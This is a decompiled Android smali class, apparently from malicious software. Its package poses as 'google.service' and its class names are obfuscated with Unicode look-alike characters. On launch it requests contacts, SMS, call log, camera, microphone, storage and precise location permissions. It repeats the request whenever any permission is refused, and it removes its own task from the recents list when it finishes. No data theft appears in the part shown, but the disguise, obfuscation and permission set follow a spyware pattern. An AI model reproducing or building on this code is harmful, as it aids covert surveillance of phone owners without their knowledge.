.class public Lgoogle/service/䉀φ$ˎʾʻʾˎⶱ$ˆ䉀ˉـˋ$ـיㅤᵎʾᵔⶱᵢㅤʿˋᴵᵢ4793;
.super Landroid/app/Activity;
.source "\u4240\u03c6$\u02ce\u02be\u02bb\u02be\u02ce\u2db1$\u02c6\u4240\u02c9\u0640\u02cb$\u0640\u05d9\u3164\u1d4e\u02be\u1d54\u2db1\u1d62\u3164\u02bf\u02cb\u1d35\u1d624793.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static varargs hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z
    .locals 4

    if-eqz p0, :cond_1

    if-eqz p1, :cond_1

    .line 18
    array-length v0, p1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :goto_0
    if-ge v2, v0, :cond_1

    aget-object v3, p1, v2

    .line 19
    invoke-static {p0, v3}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v3

    if-eqz v3, :cond_0

    return v1

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    const/4 p0, 0x1

    return p0
.end method


# virtual methods
.method public finish()V
    .locals 2

    const/4 v0, 0x0

    .line 126
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->shown:Ljava/lang/Boolean;

    .line 127
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 128
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 131
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 9

    .line 30
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 33
    :try_start_0
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->FOR_prim:Ljava/lang/Boolean;

    const/16 p1, 0x97

    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    const-string v1, "android.permission.READ_CONTACTS"

    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"

    const-string v3, "android.permission.CAMERA"

    const-string v4, "android.permission.READ_SMS"

    const-string v5, "android.permission.READ_CALL_LOG"

    const-string v6, "android.permission.RECORD_AUDIO"

    const-string v7, "android.permission.ACCESS_COARSE_LOCATION"

    const-string v8, "android.permission.ACCESS_FINE_LOCATION"

    .line 39
    filled-new-array/range {v0 .. v8}, [Ljava/lang/String;

    move-result-object v0

    .line 50
    invoke-static {p0, v0}, Lgoogle/service/䉀φ$ˎʾʻʾˎⶱ$ˆ䉀ˉـˋ$ـיㅤᵎʾᵔⶱᵢㅤʿˋᴵᵢ4793;->hasPermissions(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    .line 51
    invoke-static {p0, v0, p1}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 9

    .line 81
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    const/16 p2, 0x97

    if-eq p1, p2, :cond_0

    goto :goto_0

    .line 85
    :cond_0
    array-length p1, p3

    if-lez p1, :cond_1

    const/4 p1, 0x0

    aget p3, p3, p1

    if-nez p3, :cond_1

    .line 87
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;->FOR_prim:Ljava/lang/Boolean;

    .line 88
    invoke-virtual {p0}, Lgoogle/service/䉀φ$ˎʾʻʾˎⶱ$ˆ䉀ˉـˋ$ـיㅤᵎʾᵔⶱᵢㅤʿˋᴵᵢ4793;->finish()V

    goto :goto_0

    :cond_1
    const-string v0, "android.permission.WRITE_EXTERNAL_STORAGE"

    const-string v1, "android.permission.READ_CONTACTS"

    const-string v2, "android.permission.READ_SMS"

    const-string v3, "android.permission.READ_CALL_LOG"

    const-string v4, "android.permission.READ_EXTERNAL_STORAGE"

    const-string v5, "android.permission.CAMERA"

    const-string v6, "android.permission.RECORD_AUDIO"

    const-string v7, "android.permission.ACCESS_COARSE_LOCATION"

    const-string v8, "android.permission.ACCESS_FINE_LOCATION"

    .line 92
    filled-new-array/range {v0 .. v8}, [Ljava/lang/String;

    move-result-object p1

    .line 105
    invoke-static {p0, p1, p2}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    :goto_0
    return-void
.end method
